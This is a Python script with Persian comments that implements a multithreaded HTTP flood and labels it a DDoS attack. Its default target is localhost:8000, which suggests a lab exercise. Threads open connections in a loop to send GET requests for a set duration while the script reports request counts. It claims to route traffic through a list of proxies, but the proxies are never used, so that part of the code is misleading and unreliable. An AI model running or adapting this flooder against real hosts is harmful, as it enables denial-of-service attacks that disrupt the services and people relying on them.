import socket
import threading
import time
from datetime import datetime

class DDoSWithProxies:
    def __init__(self, target_ip='localhost', target_port=8000, num_threads=50):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        self.running = False
        self.total_requests = 0
        
        # لیست Proxies (نماینده‌ها)
        self.proxies = [
            '127.0.0.1:9001',
            '127.0.0.1:9002',
            '127.0.0.1:9003',
            '127.0.0.1:9004',
            '127.0.0.1:9005',
        ]
        
    def send_requests_via_proxy(self, thread_id, proxy):
        """ارسال درخواست‌های HTTP از طریق Proxy"""
        request_count = 0
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, self.target_port))
                
                # درخواست HTTP
                http_request = f'''GET / HTTP/1.1\r
Host: {self.target_ip}\r
Connection: close\r
\r
'''.encode()
                
                sock.sendall(http_request)
                sock.recv(1024)
                sock.close()
                
                request_count += 1
                self.total_requests += 1
                
            except Exception as e:
                pass
                
        print(f'🔫 Thread {thread_id}: {request_count} درخواست ارسال شد')
                
    def start_ddos(self, duration=30):
        """شروع حملۀ DDoS از منابع متعدد"""
        print(f'\n{"="*70}')
        print(f'🔴 شروع حملۀ DDoS از منابع متعدد')
        print(f'🎯 هدف: {self.target_ip}:{self.target_port}')
        print(f'🌍 تعداد منابع (Proxies): {len(self.proxies)}')
        print(f'🧵 تعداد Threads: {self.num_threads}')
        print(f'⏱️  مدت: {duration} ثانیه')
        print(f'⏰ شروع: {datetime.now()}')
        print(f'{"="*70}\n')
        
        self.running = True
        threads = []
        
        # تقسیم Threads بر اساس Proxies
        threads_per_proxy = self.num_threads // len(self.proxies)
        
        start_time = time.time()
        for proxy_idx, proxy in enumerate(self.proxies):
            for i in range(threads_per_proxy):
                thread_id = proxy_idx * threads_per_proxy + i
                t = threading.Thread(
                    target=self.send_requests_via_proxy, 
                    args=(thread_id, proxy)
                )
                t.daemon = True
                t.start()
                threads.append(t)
        
        # نمایش پیشرفت
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            print(f'⏳ [{elapsed}/{duration}s] درخواست‌های کل: {self.total_requests}')
            time.sleep(2)
        
        self.running = False
        
        for t in threads:
            t.join(timeout=1)
        
        print(f'\n{"="*70}')
        print(f'✅ حملۀ DDoS تمام شد')
        print(f'📊 کل درخواست‌ها: {self.total_requests}')
        print(f'📈 درخواست/ثانیه: {self.total_requests/duration:.0f}')
        print(f'🌍 منابع مختلف استفاده شد: {len(self.proxies)}')
        print(f'{"="*70}\n')

if __name__ == '__main__':
    attack = DDoSWithProxies(
        target_ip='localhost',
        target_port=8000,
        num_threads=50
    )
    attack.start_ddos(duration=30)